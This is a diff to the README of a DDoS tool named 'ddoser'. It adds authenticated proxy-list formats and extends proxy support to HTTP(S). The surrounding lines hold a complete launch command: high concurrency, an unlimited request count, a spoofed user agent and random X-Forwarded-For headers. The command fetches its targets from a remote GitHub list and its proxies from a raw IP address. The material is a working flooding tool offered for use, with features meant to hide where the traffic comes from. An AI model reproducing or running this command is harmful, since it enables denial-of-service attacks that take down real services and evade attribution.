@@ -65,6 +65,10 @@ proxy-file or proxy-url should contain proxy list in format like:
 ```text
 ip1:port1#sock5
 ip2:port2#sock4
+ip3:port3#sock4 login:password
+ip4:port4#http login:password
+ip5:port5#http login:password
+ip6:port6#https login:password
 ...
 ipN:portN#sock4
 ```
@@ -73,7 +77,7 @@ ipN:portN#sock4
 python3 ./ddoser.py --concurrency 150 --timeout 60 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --target-urls-file https://raw.githubusercontent.com/maxindahouze/reactor/main/targets3.txt --proxy-url 'http://143.244.166.15/proxy.list' --restart-period 600 --random-xff-ip
 ```
 ## Notes
-**ddoser** supports only sock proxy, also can start it directly without proxy
+**ddoser** supports SOCKS4/5 and HTTP(s) proxies with or without authorization, also can start it directly without proxy
 
 Use **--restart-period** parameter to periodically reloading targets and proxies list   
 
